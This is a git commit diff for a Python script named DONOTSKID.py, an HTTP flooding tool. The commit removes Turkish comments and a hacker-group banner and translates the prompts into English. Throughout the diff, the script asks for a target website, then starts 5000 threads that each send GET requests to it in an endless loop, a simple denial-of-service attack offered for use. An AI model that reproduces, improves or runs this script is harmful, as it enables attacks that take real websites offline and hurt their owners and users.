3e281e52d889e31f959799a99387bdcdeb33aece
npc-lab666 <wsgbro17@gmail.com>
2025-08-08 21:05:35 +0800

    Update DONOTSKID.py

--- DONOTSKID.py
+++ DONOTSKID.py
@@ -1,44 +1,32 @@
 import os
 import threading
 import requests
-import pyfiglet
-from termcolor import colored
 
-# Ekranı temizleme fonksiyonu
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-# Ekranı temizle
 clear_screen()
 
-# Büyük ASCII "NPCSLAB" yazısı (Kırmızı)
-ascii_banner = pyfiglet.figlet_format("FSOCIETY TEAM")
-print(colored(ascii_banner, 'red'))
+print("DODO-script")
+print("Youtube: sudoku_npc")
 
-# Küçük kırmızı "TikTok: zted_or_npc" yazısı
-print(colored("TikTok: zted_or_npc", 'red'))
+target_url = input("\nEnter target site (with http:// or https://): ")
 
-# Kullanıcıdan WEBSITE ATTACKER al
-target_url = input("\nHedef siteyi gir (http:// veya https:// ile): ")
-
-# Aynı anda çalışacak istek sayısı
 num_requests = 5000
 
 def attack():
     while True:
         try:
             response = requests.get(target_url)
-            print(f"ATTACKING USING BOT: {response.status_code}")
+            print(f"[+] Request sent! Status Code: {response.status_code}")
         except requests.exceptions.RequestException:
-            print("SPAMMING REQUEST FROM YOUR PHONE")
+            print("[-] Error! Server not responding.")
 
-# Thread’leri başlat
 threads = []
 for _ in range(num_requests):
     t = threading.Thread(target=attack)
     t.start()
     threads.append(t)
 
-# Thread’lerin bitmesini bekle
 for t in threads:
     t.join()
